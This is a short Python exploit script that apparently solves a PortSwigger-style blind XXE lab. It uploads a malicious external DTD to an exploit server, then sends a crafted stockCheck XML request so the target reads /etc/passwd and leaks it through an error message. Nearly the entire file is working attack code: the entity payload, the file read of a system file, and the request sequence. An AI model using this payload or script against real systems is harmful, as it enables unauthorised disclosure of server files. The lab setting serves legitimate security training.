import time
import re
import requests
import sys


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python script.py <url> <full collabolator url>")
        sys.exit(1)

target_url = sys.argv[1]
colab_url = 'http://'+sys.argv[2]

def find_exploit_url(content):
    match = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', content)
    if match:
        return match.group(0)
    else:
        raise Exception("Zle url podales")

response = requests.get(target_url)
if response.status_code != 200:
    raise Exception(f"Failed")

exploit_url = find_exploit_url(response.text)

burp_headers_exploit = {"Content-Type": "application/x-www-form-urlencoded"}
burp_data_exploit = {"urlIsHttps": "on", "responseFile": "/exploit", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/plain; charset=utf-8", "responseBody": "<!ENTITY % file SYSTEM \"file:///etc/passwd\">\r\n<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>\">\r\n%eval;\r\n%exfil;", "formAction": "STORE"}
requests.post(exploit_url, headers=burp_headers_exploit, data=burp_data_exploit)
time.sleep(1)

burp_headers = {"Content-Type": "application/xml"}
burp_data = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<!DOCTYPE stockCheck [ <!ENTITY % xxe SYSTEM \""+exploit_url+'/exploit'+"\"> %xxe; ]>\r\n<stockCheck><productId>3</productId><storeId>1</storeId></stockCheck>"
requests.post(target_url+'/product/stock', headers=burp_headers, data=burp_data)
